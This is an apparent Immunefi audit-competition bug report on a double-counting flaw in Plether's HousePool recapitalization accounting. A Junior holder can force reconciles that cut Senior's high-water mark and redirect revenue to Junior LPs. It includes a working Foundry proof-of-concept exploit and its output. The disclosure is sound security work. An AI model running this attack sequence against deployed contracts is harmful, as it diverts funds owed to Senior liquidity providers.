# \#99008 [SC-High] Pending recapitalization is counted twice in HousePool, letting Junior holders take revenue owed to Senior LPs

**Submitted on Nov 11th 2026 at 12:25:29 UTC by @vesko210 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99008
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro
When a loss wipes out both tranches, the owner restores the pool with a recapitalization. The part of it that is real equity becomes Senior principal, Senior's high-water mark (the amount future revenue must restore Senior to before Junior earns anything) is set to the full recapitalization, and the part that only covers the shortfall stays pending until it is backed. HousePool's reconcile measures that pending part against all of the pool's distributable equity, including the equity that already backs the Senior principal created from the same recapitalization. On every later reconcile the same equity is therefore counted twice. Senior principal is written off as a loss that never happened, re-created through the code path meant for an empty tranche, and Senior's high-water mark is overwritten with the smaller pending amount. Any Junior holder can force such a reconcile at will. In production this permanently cuts the recovery Senior LPs are owed, and pool revenue that should restore Senior LPs is paid to Junior LPs instead.

## Vulnerability Details
**How recovery is designed to work.**

Pool revenue follows a waterfall. Senior principal is restored up to Senior's high-water mark first, and Junior only earns after that. Losses lower principal but are never supposed to lower the high-water mark, which records what Senior is still owed.

When trader claims exceed pool cash, the pool has a terminal deficit and both tranches are reduced to zero principal. The documented recovery is an owner call to `CfdEngine.recapitalizePool`. The recapitalized cash is recorded in a pending recapitalization bucket, and the next reconcile applies it:
- The part of the bucket that is backed by real equity (pool cash minus trader claims) is applied to Senior. Because both tranches are at zero, this goes through the bootstrap branch: it creates Senior principal and sets the high-water mark to the full recapitalization.
- The rest of the bucket only covers the shortfall to traders and is not equity yet. It stays pending, and it is reserved, so it can be applied later when new money backs it.

After this first reconcile the state is correct. Senior principal equals the backed part, the high-water mark equals the full recapitalization, and the shortfall-covering part waits in the pending bucket. The project's own test asserts exactly this state.

**What goes wrong on the next reconcile.**

Every reconcile tries to settle the pending bucket again. `HousePool._settleablePendingClaimantBuckets` caps it by the pool's entire distributable equity:

```solidity
// HousePool.sol
return HousePoolPendingPreviewLib.capClaimantBuckets(claimantBuckets, reconcileSnapshot.distributable);
```

`HousePoolReconcilePlanLib` then removes that settleable amount from distributable equity before it compares the remaining equity with tranche principal:

```solidity
// HousePoolReconcilePlanLib.sol
if (pendingBucketAssets > 0) {
    snapshot.distributable =
        snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
}
```

On the first reconcile this is correct, because the distributable equity is new and nobody owns it yet. On every later reconcile, the distributable equity is the same equity that already backs the Senior principal created in the first pass. The cap does not subtract the principal that already exists, so the pending part is allowed to claim that equity a second time.

When the pending part is at least as large as the Senior principal, all distributable equity is reserved for it. This happens whenever the owner recapitalizes no more than twice the shortfall. The plan then sees Senior principal against zero remaining equity and books a loss equal to the whole Senior principal. No value has left the pool; the loss exists only because the same equity was counted twice.

Senior and Junior principal are now both zero, so the pending bucket is applied again through the bootstrap branch meant for an empty tranche:

```solidity
// HousePoolPendingPreviewLib.sol
if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
    state.waterfall.seniorPrincipal += remaining;
    state.waterfall.seniorHighWaterMark =
        recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
```

Senior principal is re-created at the same value. The high-water mark, however, is overwritten. The target passed in is the bucket as it stands now, after the earlier application, not the owner's original recapitalization. So the high-water mark drops to the remaining pending amount, and the pending amount shrinks by the re-created principal, although no new money arrived.

Each further reconcile repeats the same steps until the pending bucket is empty. The final high-water mark is no higher than the original shortfall, and the recovery entitlement the recapitalization gave Senior is gone.

**Who can trigger it.**

The reconcile is persisted whenever `HousePool.settleLpEpoch` makes progress.
- With no open positions, `settleLpEpoch` can be called by anyone.
- One queue item is enough to make progress, and a redemption that pays out nothing still counts: it is refunded and marked as processed.
- After the wipe, Junior shares are worth nothing, so any Junior holder can request to redeem their whole balance. A full-balance request is exempt from the minimum redemption size, and the shares are returned with the refund.

A Junior holder can therefore force as many reconciles as needed, at any time, for the cost of gas. The regular keeper settlement causes the same damage on its own whenever such a request is in the queue.

**Why this is not intended.**
- The accounting specification states that losses do not reduce the Senior high-water mark, and that reserving pending buckets prevents counting the same inflow twice. Here a phantom loss lowers the high-water mark, and the same inflow is counted twice.
- For pre-audit finding SC-L1, the team stated that the pending part of a recapitalization "stays pending, stays reserved everywhere, and gets applied later once it's backed". Here it is used up with no new money behind it, so that fix is incomplete.
- The project's test of the recapitalization residual checks the state after one reconcile only. The error appears on the second one.

**Example.**

The pool ends up 154,107 USDG short and the owner recapitalizes 308,214 USDG. After the first reconcile:
- Senior principal is 154,107 USDG;
- the high-water mark is 308,214 USDG;
- 154,107 USDG is pending.

A single reconcile forced by a Junior holder leaves pool cash and trader claims untouched. It drops the pending amount to zero and the high-water mark to 154,107 USDG.

## Impact Details
Selected impact: Theft of unclaimed yield (High).

The high-water mark decides who receives pool revenue after a loss: revenue restores Senior up to the mark before Junior gets anything. Lowering the mark without any loss of value takes future revenue that belongs to Senior LPs and gives it to Junior LPs.
- **The loss to Senior LPs** is the difference between the high-water mark the recapitalization set and the mark left after the bug. Repeated reconciles drive the mark down to at most the original shortfall. So Senior loses at least the whole part of the recapitalization that was meant to restore them beyond covering the shortfall.
- **The loss is permanent.** No code path raises the high-water mark back, so every unit of revenue in that range goes to Junior instead of Senior.
- **The gain to the attacker.** It goes to Junior holders, pro rata. Junior shares are worthless at that point, so everything redirected to them is pure profit. A large Junior holder has a direct incentive to trigger the bug, and it costs only gas and a redemption request that is refunded.
- **The recapitalization intent is consumed.** The pending part of the owner's funds is used up without any cash backing it, which defeats the purpose of keeping it reserved.

In the example above, Senior's recovery target falls from 308,214 to 154,107 USDG, so Senior loses 154,107 USDG of recovery, half of what the owner put in for them. If the pool then earns 54,045 USDG from a losing trader, all of it should go to Senior. After the bug, all of it goes to Junior. The same happens for every recapitalization of up to twice the shortfall.

## References
- Pending bucket capped by all distributable equity (HousePool): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1829-L1834
- Settleable amount removed from equity before the principal comparison: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L71
- Bootstrap branch that resets the high-water mark: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L117-L122
- The project's test of the state after one reconcile: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/waterfall/HousePoolWaterfall.t.sol#L177-L219
- The accounting specification (Senior/Junior waterfall): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md
- The pre-audit report with the SC-L1 fix: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-pre-audit-report.pdf


## Proof of Concept

## Proof of Concept

**Test file:** `packages/perps/test/perps/poc/RecapResidualDrainPoC.t.sol` (create it with the code below)
**Run** (from the repository root): `forge test --root packages/perps --match-path test/perps/poc/RecapResidualDrainPoC.t.sol -vv`

The test runs on the project's own Foundry setup with the release parameters and does not change any in-scope contract. Only Pyth prices and the USDG token are mocked. All trades go through the real order router, and the owner only calls `recapitalizePool` and `clearDegradedMode`, the documented recovery steps.

### Steps
**Step 1.** Senior LPs deposit 400,000 USDG and Junior LPs deposit about 600,000 USDG.

**Step 2.** The pool loses more than all LP capital. Traders open matching long and short positions of 900,000 USDG each. The price rises 60% and the short side closes with a profit. The price then falls to 0.30 and the long side closes with a profit of 630,000 USDG. The pool has only 475,892 USDG left, so it is 154,107 USDG short of what it owes traders, and both tranches are wiped out.

**Step 3.** The owner follows the recovery runbook: it recapitalizes 308,214 USDG, twice the shortfall, and clears degraded mode.

**Step 4.** The first settlement applies the recapitalization correctly. Senior principal becomes 154,107 USDG, the Senior high-water mark is set to 308,214 USDG, and 154,107 USDG stays pending.

**Step 5.** This is the attack. A Junior holder requests to redeem their worthless shares and calls the settlement once the request matures. No money enters or leaves the pool and trader claims do not change, yet the Senior high-water mark drops to 154,107 USDG and the pending amount drops to zero.

**Step 6.** A trader loses 54,045 USDG to the pool, and the next settlement distributes that revenue. The test runs this step twice from the same starting point. Without the attack, Senior receives all 54,045 USDG. With the attack, Junior receives all 54,045 USDG.

**Step 7.** A fuzz test repeats the attack for recapitalizations between 1.25 and 2 times the shortfall. Every time, the pending amount is emptied and the Senior high-water mark ends no higher than the shortfall.

### Code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {console2} from "forge-std/console2.sol";

/// @notice After a terminal deficit d and an owner recapitalization R with d < R <= 2d, one empty LP settlement pass
///         re-caps the pending recapitalization residual against the equity that already backs Senior principal.
///         Senior principal is written off, re-minted by the bootstrap branch, and the Senior high-water mark is
///         overwritten with the smaller residual. The residual is consumed without new backing, and the next LP
///         revenue that should restore Senior is credited to Junior.
///
///         Only Pyth prices (MockPyth) and USDG (MockSettlementToken) are mocked. Every step uses a public entry
///         point: Router commit/execute, CfdEngine.recapitalizePool and clearDegradedMode (owner recovery runbook),
///         TrancheVault.requestRedeem, and HousePool.settleLpEpoch (permissionless while no position is open).
contract RecapResidualDrainPoC is BasePerpTest {

    address internal constant KEEPER = address(0xBEEF);
    address internal constant SENIOR_LP = address(0x5E01);
    address internal constant JUNIOR_LP = address(0x1E01);
    address internal constant RECAP_PASS_JUNIOR = address(0x1E02);
    address internal constant ATTACKER = address(0xA77A);
    address internal constant FINAL_PASS_JUNIOR = address(0x1E03);
    address internal constant LONG_TRADER = address(0xA001);
    address internal constant SHORT_TRADER = address(0xB001);
    address internal constant REVENUE_TRADER = address(0xC001);

    struct Outcome {
        uint256 revenue;
        uint256 seniorPrincipal;
        uint256 juniorPrincipal;
        uint256 juniorFunded;
        uint256 seniorHwm;
    }

    /// @dev Release risk parameters from packages/perps/DEPLOYMENT.md ("Initial release parameters").
    ///      The engine defaults already match the release execution fee (4 bps) and settlement buffer (25 bps).
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        // Release Senior caps: 40M USDG and 80% of the pool.
        _setSeniorCapacity(40_000_000e6, 8000);
        _fundJunior(JUNIOR_LP, 600_000e6);
        _fundSenior(SENIOR_LP, 400_000e6);
        _fundJunior(RECAP_PASS_JUNIOR, 1000e6);
        _fundJunior(ATTACKER, 1000e6);
        _fundJunior(FINAL_PASS_JUNIOR, 1000e6);
    }

    /// @notice One empty settlement pass consumes the pending residual and cuts the Senior recovery target from R to d.
    function test_EmptySettlementPassDrainsRecapResidualAndCutsSeniorHwm() public {
        uint256 deficit = _buildTerminalDeficit();
        uint256 recap = 2 * deficit;
        _ownerRecapitalizes(recap);

        // Pass 1 applies the recapitalization. This is the state the repository's own test asserts as intended
        // (HousePoolWaterfall.t.sol: test_PendingRecapitalization_CapsAgainstTraderClaimLiabilitiesAndCarriesResidual).
        _emptyJuniorPass(RECAP_PASS_JUNIOR);
        _logPool("[pass 1] recap applied ");
        assertEq(pool.juniorPrincipal(), 0, "Junior wiped by the deficit");
        assertEq(pool.seniorPrincipal(), deficit, "Senior restored by recap minus deficit");
        assertEq(pool.seniorHighWaterMark(), recap, "Residual recap preserves Senior's recovery target");
        assertEq(pool.pendingRecapitalizationAssets(), deficit, "Unsettled recap must remain pending");

        uint256 cashBefore = pool.totalAssets();
        uint256 claimsBefore = engine.totalTraderClaimBalanceAssets();

        // Pass 2: a Junior holder forces a persisted reconcile with a zero-value redemption. Nothing else happens.
        IHousePool.LpEpochSettlementResult memory result = _emptyJuniorPass(ATTACKER);
        _logPool("[pass 2] empty pass    ");
        console2.log("[pass 2] pool cash unchanged       :", pool.totalAssets() == cashBefore);
        console2.log("[pass 2] trader claims unchanged   :", engine.totalTraderClaimBalanceAssets() == claimsBefore);

        assertEq(result.seniorFundedAssets + result.juniorFundedAssets, 0, "no LP was paid in the pass");
        assertEq(pool.totalAssets(), cashBefore, "no cash entered or left the pool");
        assertEq(engine.totalTraderClaimBalanceAssets(), claimsBefore, "trader claims unchanged");
        assertEq(pool.pendingRecapitalizationAssets(), 0, "residual consumed without new backing");
        assertEq(pool.seniorHighWaterMark(), deficit, "Senior HWM overwritten from R down to d");
        assertEq(pool.seniorPrincipal(), deficit, "Senior principal unchanged, so its recovery gap is now zero");
    }

    /// @notice Same state, same revenue: without the empty pass the revenue restores Senior; with one empty pass first,
    ///         all of it is credited to Junior.
    function test_EmptyPassRedirectsSeniorRecoveryRevenueToJunior() public {
        uint256 deficit = _buildTerminalDeficit();
        _ownerRecapitalizes(2 * deficit);
        _emptyJuniorPass(RECAP_PASS_JUNIOR);
        _logPool("[pass 1] recap applied ");

        uint256 snapshot = vm.snapshotState();
        Outcome memory control = _finishScenario(false);
        vm.revertToState(snapshot);
        Outcome memory attacked = _finishScenario(true);

        console2.log("[revenue] LP revenue from trading (USDG)    :", control.revenue / 1e6);
        console2.log("[control] Senior principal gain (USDG)      :", (control.seniorPrincipal - deficit) / 1e6);
        console2.log("[control] Junior principal gain (USDG)      :", (control.juniorPrincipal + control.juniorFunded) / 1e6);
        console2.log("[control] Senior HWM (USDG)                 :", control.seniorHwm / 1e6);
        console2.log("[attacked] Senior principal gain (USDG)     :", (attacked.seniorPrincipal - deficit) / 1e6);
        console2.log(
            "[attacked] Junior principal gain (USDG)     :", (attacked.juniorPrincipal + attacked.juniorFunded) / 1e6
        );
        console2.log("[attacked] Senior HWM (USDG)                :", attacked.seniorHwm / 1e6);

        assertEq(attacked.revenue, control.revenue, "identical trading revenue in both runs");
        assertGt(control.revenue, 50_000e6, "material LP revenue");

        assertEq(control.seniorPrincipal, deficit + control.revenue, "control: revenue restores Senior");
        assertEq(control.juniorPrincipal + control.juniorFunded, 0, "control: Junior receives nothing");
        assertEq(control.seniorHwm, 2 * deficit, "control: Senior recovery target intact");

        assertEq(attacked.seniorPrincipal, deficit, "attacked: Senior receives nothing");
        assertEq(
            attacked.juniorPrincipal + attacked.juniorFunded, control.revenue, "attacked: Junior captures the revenue"
        );
        assertEq(attacked.seniorHwm, deficit, "attacked: Senior recovery target cut from 2d to d");
    }

    /// @notice Every recapitalization with d < R <= 2d is affected (fuzzed over R in [1.25d, 2d]). Repeated empty
    ///         passes drain the residual completely and leave the Senior recovery target at or below d.
    /// forge-config: default.fuzz.runs = 64
    function testFuzz_AnyRecapUpToTwiceTheDeficitLosesSeniorRecoveryTarget(
        uint256 recapBps
    ) public {
        recapBps = bound(recapBps, 12_500, 20_000);
        address[6] memory passHolders;
        for (uint256 i; i < passHolders.length; ++i) {
            passHolders[i] = address(uint160(0x7000 + i));
            _fundJunior(passHolders[i], 1000e6);
        }

        uint256 deficit = _buildTerminalDeficit();
        uint256 recap = (deficit * recapBps) / 10_000;
        _ownerRecapitalizes(recap);
        _emptyJuniorPass(RECAP_PASS_JUNIOR);
        assertEq(pool.seniorHighWaterMark(), recap, "recovery target recorded by the recapitalization");
        assertEq(pool.pendingRecapitalizationAssets(), deficit, "residual equals the deficit");

        uint256 seniorPrincipal = pool.seniorPrincipal();
        uint256 cash = pool.totalAssets();
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        for (uint256 i; i < passHolders.length && pool.pendingRecapitalizationAssets() > 0; ++i) {
            _emptyJuniorPass(passHolders[i]);
        }

        assertEq(pool.totalAssets(), cash, "no cash entered or left the pool");
        assertEq(engine.totalTraderClaimBalanceAssets(), claims, "trader claims unchanged");
        assertEq(pool.seniorPrincipal(), seniorPrincipal, "Senior principal unchanged");
        assertEq(pool.pendingRecapitalizationAssets(), 0, "residual consumed without new backing");
        assertLe(pool.seniorHighWaterMark(), deficit, "Senior recovery target cut to at most d");
    }

    // ---------------------------------------------------------------------------------------------------------------
    // Scenario steps
    // ---------------------------------------------------------------------------------------------------------------

    /// @dev Reaches the terminal-deficit state (SECURITY.md "Explicit terminal-deficit cascade") through Router trades:
    ///      a hedged book at the admission limit, a SHORT gain that latches degraded mode (raw E < L), then a LONG gain
    ///      larger than the remaining pool cash, recorded as a trader claim.
    function _buildTerminalDeficit() internal returns (uint256 deficit) {
        _fundTrader(LONG_TRADER, 700_000e6);
        _fundTrader(SHORT_TRADER, 100_000e6);
        for (uint256 i; i < 4; ++i) {
            _trade(LONG_TRADER, CfdTypes.Side.LONG, 200_000e18, 130_000e6, false, 1e8);
            _trade(SHORT_TRADER, CfdTypes.Side.SHORT, 200_000e18, 10_000e6, false, 1e8);
        }
        _trade(LONG_TRADER, CfdTypes.Side.LONG, 100_000e18, 80_000e6, false, 1e8);
        _trade(SHORT_TRADER, CfdTypes.Side.SHORT, 100_000e18, 10_000e6, false, 1e8);

        _trade(SHORT_TRADER, CfdTypes.Side.SHORT, 900_000e18, 0, true, 1.6e8);
        assertTrue(engine.degradedMode(), "raw E < L latches degraded mode");
        _trade(LONG_TRADER, CfdTypes.Side.LONG, 900_000e18, 0, true, 0.3e8);

        uint256 claims = engine.totalTraderClaimBalanceAssets();
        uint256 cash = pool.totalAssets();
        assertGt(claims, cash, "terminal deficit: trader claims exceed pool cash");
        deficit = claims - cash;
        console2.log("[deficit] pool cash (USDG)          :", cash / 1e6);
        console2.log("[deficit] trader claims (USDG)      :", claims / 1e6);
        console2.log("[deficit] deficit d (USDG)          :", deficit / 1e6);
    }

    /// @dev Owner recovery runbook: recapitalize from the owner wallet, then clear degraded mode.
    function _ownerRecapitalizes(
        uint256 amount
    ) internal {
        settlementToken.mint(address(this), amount);
        settlementToken.approve(address(engine), amount);
        engine.recapitalizePool(amount);
        engine.clearDegradedMode();
        console2.log("[owner] recapitalizePool R (USDG)   :", amount / 1e6);
    }

    /// @dev A Junior holder queues a zero-value redemption of its whole balance; at maturity anyone settles the epoch.
    ///      The refund counts as progress, so the reconcile inside settleLpEpoch is persisted.
    function _emptyJuniorPass(
        address holder
    ) internal returns (IHousePool.LpEpochSettlementResult memory result) {
        uint256 requestId = _queueFullJuniorRedeem(holder);
        _warpTo(pool.lpEpochStart(requestId));
        vm.prank(holder);
        result = pool.settleLpEpoch(0, 0);
    }

    function _finishScenario(
        bool attack
    ) internal returns (Outcome memory outcome) {
        // Identical timing in both runs: the attacker's request is queued and matures either way.
        uint256 attackerRequest = _queueFullJuniorRedeem(ATTACKER);
        _warpTo(pool.lpEpochStart(attackerRequest));
        if (attack) {
            vm.prank(ATTACKER);
            pool.settleLpEpoch(0, 0);
            _logPool("[attacked] after empty pass ");
        }

        outcome.revenue = _generateLpRevenue();

        uint256 finalRequest = _queueFullJuniorRedeem(FINAL_PASS_JUNIOR);
        _warpTo(pool.lpEpochStart(finalRequest));
        vm.prank(FINAL_PASS_JUNIOR);
        IHousePool.LpEpochSettlementResult memory result = pool.settleLpEpoch(0, 0);

        outcome.seniorPrincipal = pool.seniorPrincipal();
        outcome.juniorPrincipal = pool.juniorPrincipal();
        outcome.juniorFunded = result.juniorFundedAssets;
        outcome.seniorHwm = pool.seniorHighWaterMark();
    }

    /// @dev LP revenue after recovery: a LONG opened at 1.00 and closed at a loss at 1.90.
    function _generateLpRevenue() internal returns (uint256 revenue) {
        _fundTrader(REVENUE_TRADER, 100_000e6);
        uint256 cashBefore = pool.totalAssets();
        _trade(REVENUE_TRADER, CfdTypes.Side.LONG, 60_000e18, 60_000e6, false, 1e8);
        _trade(REVENUE_TRADER, CfdTypes.Side.LONG, 60_000e18, 0, true, 1.9e8);
        revenue = pool.totalAssets() - cashBefore;
    }

    // ---------------------------------------------------------------------------------------------------------------
    // Helpers
    // ---------------------------------------------------------------------------------------------------------------

    function _trade(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        vm.prank(account);
        uint64 orderId = router.commitOrder(side, size, margin, 0, isClose);
        bytes[] memory update = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, update);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order must execute");
    }

    function _queueFullJuniorRedeem(
        address holder
    ) internal returns (uint256 requestId) {
        uint256 shares = juniorVault.balanceOf(holder);
        assertGt(shares, 0, "holder owns Junior shares");
        vm.prank(holder);
        requestId = juniorVault.requestRedeem(shares, holder, holder);
    }

    function _warpTo(
        uint256 timestamp
    ) internal {
        if (block.timestamp < timestamp) {
            vm.warp(timestamp);
        }
    }

    function _logPool(
        string memory tag
    ) internal view {
        console2.log(string.concat(tag, " Senior principal (USDG) :"), pool.seniorPrincipal() / 1e6);
        console2.log(string.concat(tag, " Senior HWM (USDG)       :"), pool.seniorHighWaterMark() / 1e6);
        console2.log(string.concat(tag, " pending residual (USDG) :"), pool.pendingRecapitalizationAssets() / 1e6);
    }

}
```

### Output

```
Ran 3 tests for test/perps/poc/RecapResidualDrainPoC.t.sol:RecapResidualDrainPoC
[PASS] testFuzz_AnyRecapUpToTwiceTheDeficitLosesSeniorRecoveryTarget(uint256) (runs: 64, μ: 28168668, ~: 27981033)
[PASS] test_EmptyPassRedirectsSeniorRecoveryRevenueToJunior() (gas: 31572834)
Logs:
  [deficit] pool cash (USDG)          : 475892
  [deficit] trader claims (USDG)      : 630000
  [deficit] deficit d (USDG)          : 154107
  [owner] recapitalizePool R (USDG)   : 308214
  [pass 1] recap applied  Senior principal (USDG) : 154107
  [pass 1] recap applied  Senior HWM (USDG)       : 308214
  [pass 1] recap applied  pending residual (USDG) : 154107
  [attacked] after empty pass  Senior principal (USDG) : 154107
  [attacked] after empty pass  Senior HWM (USDG)       : 154107
  [attacked] after empty pass  pending residual (USDG) : 0
  [revenue] LP revenue from trading (USDG)    : 54045
  [control] Senior principal gain (USDG)      : 54045
  [control] Junior principal gain (USDG)      : 0
  [control] Senior HWM (USDG)                 : 308214
  [attacked] Senior principal gain (USDG)     : 0
  [attacked] Junior principal gain (USDG)     : 54045
  [attacked] Senior HWM (USDG)                : 154107

[PASS] test_EmptySettlementPassDrainsRecapResidualAndCutsSeniorHwm() (gas: 23509246)
Logs:
  [deficit] pool cash (USDG)          : 475892
  [deficit] trader claims (USDG)      : 630000
  [deficit] deficit d (USDG)          : 154107
  [owner] recapitalizePool R (USDG)   : 308214
  [pass 1] recap applied  Senior principal (USDG) : 154107
  [pass 1] recap applied  Senior HWM (USDG)       : 308214
  [pass 1] recap applied  pending residual (USDG) : 154107
  [pass 2] empty pass     Senior principal (USDG) : 154107
  [pass 2] empty pass     Senior HWM (USDG)       : 154107
  [pass 2] empty pass     pending residual (USDG) : 0
  [pass 2] pool cash unchanged       : true
  [pass 2] trader claims unchanged   : true

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 2.48s (2.55s CPU time)
```

### Output vs expected
The trades leave the pool 154,107 USDG short and the owner recapitalizes 308,214 USDG. The first settlement gives the correct state: Senior principal of 154,107 USDG, a high-water mark of 308,214 USDG and 154,107 USDG pending.

The attacker's settlement moves no money, yet it cuts the high-water mark to 154,107 USDG and empties the pending amount. When the pool then earns 54,045 USDG, Senior receives all of it in the run without the attack and Junior receives all of it in the run with the attack. The fuzz test confirms the same result for 64 different recapitalization amounts.

Expected: a settlement in which nothing has changed should change nothing, the pending amount should wait until new money backs it, and revenue should restore Senior up to the high-water mark the owner's recapitalization set.

